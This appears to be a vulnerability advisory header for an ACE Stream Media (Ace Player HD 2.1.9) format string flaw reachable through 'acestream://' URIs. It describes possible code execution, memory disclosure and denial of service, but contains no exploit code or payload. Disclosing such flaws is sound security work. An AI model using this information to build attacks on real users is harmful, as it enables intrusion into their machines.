ACE Stream Media 2.1 (acestream://) Format String Exploit PoC


Vendor: ACE Stream
Product web page: http://www.acestream.org
Affected version: Ace Player HD 2.1.9 (VLC 2.0.5)

Summary: Ace Stream is an innovative multimedia platform of a new
generation, which includes different products and solutions for
ordinary Internet users as well as for professional members of the
multimedia market. Ace Stream uses in its core, P2P (peer-to-peer)
technology, BitTorrent protocol, which is acknowledged as the most
effective protocol to transfer/deliver 'heavy content'.

Desc: ACE Stream Media (Ace Player HD) is prone to a remote format
string vulnerability because the application fails to properly
sanitize user-supplied input thru the URI using the 'acestream://'
protocol before including it in the format-specifier argument of
a formatted-printing function. A remote attacker may exploit this
issue to execute arbitrary code with the privileges of the user
running the affected application and/or cause memory address disclosure.
Failed exploit attempts may cause denial-of-service (DoS) conditions.


Tested on: Microsoft Windows 7 Professional SP1 (EN) 64bit
